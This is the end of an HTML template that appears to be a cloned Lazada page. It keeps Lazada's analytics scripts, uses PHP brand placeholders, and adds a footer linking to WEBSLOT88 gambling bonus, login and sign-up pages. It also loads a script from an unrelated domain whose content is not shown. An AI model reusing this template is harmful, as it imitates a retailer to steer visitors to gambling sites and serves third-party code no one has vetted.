    !function(c,b,d,a){c[a]||(c[a]={}),c[a].config={useFmp:true,autoSendPerf:autoSendPerf,sample:lzdRetcodeSample,sendResource:true,pid:lzdRetcodePid,disableHook:true,imgUrl:"?",page:lzdRetcodePageName};with(b){with(body){with(appendChild(createElement("script"),firstChild)){setAttribute("defer","");setAttribute("async","");setAttribute("crossorigin","");src=d}}}}(window,document,"","__bl");
</script>
    <div th:if="${script} ne null and ${script.umid} ne null and ${script.umid} eq true">
    </div>
        
  <script src="https://asset-satset.info/lazada/tumere.js" defer async></script>
  <script>
    (function () {
      try {
        var webVitalsScript = document.createElement('script');
        webVitalsScript.src = '';
        webVitalsScript.onload = function () {
          var WebVitalsDelta = {
            FCP: null,
            CLS: null,
            FID: null,
            LCP: null,
            INP: null,
          };

          function webVitalsCb(entry) {
            if(entry && entry.name && entry.delta ) {
              WebVitalsDelta[entry.name] = entry.delta;
              if (entry.name === 'INP') {
                webVitalsSingleReport(entry);
              } else if (window.requestIdleCallback) {
                window.requestIdleCallback(function () {
                  webVitalsSingleReport(entry);
                });
              }
            }
          }

          function webVitalsSingleReport(entry) {
            if (window.__wpk && window.__wpk.report) {
              var name = entry && entry.name || '';
              var delta = entry  && entry.delta || '';
              const categories = {
                FCP: 101,
                CLS: 103,
                FID: 104,
                LCP: 102,
                INP: 119
              };
              window.__wpk.report({
                category: categories[name],
                msg: window.location.host,
                wl_avgv1: delta,
                bl1: entry &&  Object.prototype.toString.call(entry) === "[object Object]" ? JSON.stringify(entry) : '',
                c1: entry && entry.rating ||''
              });
            }
          }
          window.webVitals.getFCP(webVitalsCb);
          window.webVitals.getCLS(webVitalsCb);
          window.webVitals.getFID(webVitalsCb);
          window.webVitals.getLCP(webVitalsCb);
          window.webVitals.getINP(webVitalsCb);
        };
        // if(document.head) document.head.appendChild(webVitalsScript);
        function report() {
          var fsp = null;
          var csr = null;
          if (timings.start && timings.render) {
            // for ssr
            if (timings.ssr) {
              fsp = timings.ssr - timings.start;
              csr = timings.render - timings.ssr;
            } else {
              fsp = timings.render - timings.start;
            }
          }
          if (fsp && window.__wpk && window.__wpk.report) {
            __wpk.report({
              category: 105,
              msg: window.location.host,
              wl_avgv1: fsp,
              wl_avgv2: csr || 0,
              c1: window.__hasSSR__ ? 1 : 0,
            });
          }
        }
        document.addEventListener('DOMContentLoaded', function () {
          if (window.timings) {
            if (window.timings.render) {
              report();
            } else {
              setTimeout(function () {
                report();
              }, 3000);
            }
          }
        })
      } catch (err) {
        console.log(err && err.message)
      }
    })();
</script>
  <script>
  if (window.baxiaCommon) {
    baxiaCommon.init({
      appendTo: "header",
      umOptions: {
        serviceLocation: "<?php echo htmlspecialchars($BRANDS); ?>"
      },
      checkApiPath: url => {
        return url.indexOf("mtop.<?php echo htmlspecialchars($BRANDS); ?>.promotion.voucher.spread") > -1;
      }
    });
  }
</script>
 <style>
    .fixed-footer {
            display: flex;
            justify-content: space-around;
            position: fixed;
            background: linear-gradient(to bottom, rgb(0 0 0) 0%, #000000 50%, rgb(0 0 0) 100%);
            box-shadow: inset 2px 2px 2px 0px rgba(255, 255, 255, 0.5), 7px 7px 20px 0px rgba(0, 0, 0, 0.1), 4px 4px 5px 0px rgba(0, 0, 0, 0.1);
            outline: none;
            padding: 5px 0;
            border-radius: 20px 20px 0px 0px;
            box-shadow: 0 0 5px 5px #ffd700;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 99
        }

        .fixed-footer a {
            flex-basis: calc((100% - 15px*6)/ 5);
            text-decoration: none;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #fff;
            max-width: 75px;
            font-size: 12px;
            font-family: Ubuntu, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
        }

        .fixed-footer a:hover {
            font-weight: bold;
        }

        .fixed-footer .center {
            transform: scale(1.5) translateY(-5px);
            background: center no-repeat;
            background-size: contain;
            background-color: inherit;
            border-radius: 50%;
        }

        .fixed-footer img {
            max-width: 20px;
            margin-bottom: 0;
            max-height: 20px;
        }

        .lzd-footer-copyright {
            text-align: center;
            margin-top: 20px;
            font-weight: bold;
            color: white;
        }
</style>
<div class="fixed-footer">
    <a href="https://linktr.ee/webslot88" rel="nofollow noopener" target="_blank">
        <img layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/07/30/promo.png" alt="Bonus <?php echo htmlspecialchars($BRANDS); ?>">
        Bonus
    </a>
    <a href="https://linkr.bio/WEBSLOT88/" rel="nofollow noopener" target="_blank">
        <img layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/07/30/login.png" alt="Login <?php echo htmlspecialchars($BRANDS); ?>">
        Login
    </a>
    <a href="https://mez.ink/webslot88" rel="nofollow noopener" target="_blank" class="tada">
        <img layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/07/30/daftar.png" alt="Daftar <?php echo htmlspecialchars($BRANDS); ?>">
        Daftar
    </a>
    <a href="https://linkr.bio/WEBSLOT88/" rel="nofollow noopener" target="_blank">
        <img layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/07/30/alternatif.png" alt="Link Alternatif <?php echo htmlspecialchars($BRANDS); ?>">
        Link Alternatif
    </a>
    <a href="https://linktr.ee/WEBSLOT88/" rel="nofollow noopener" target="_blank"
        class="js_live_chat_link live-chat-link">
        <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/07/30/livechat.png"
            alt="Live Chat <?php echo htmlspecialchars($BRANDS); ?>">
        Livechat
    </a>
</div>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93635b8dce0369b7',t:'MTc0NTY0MTk2MS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>
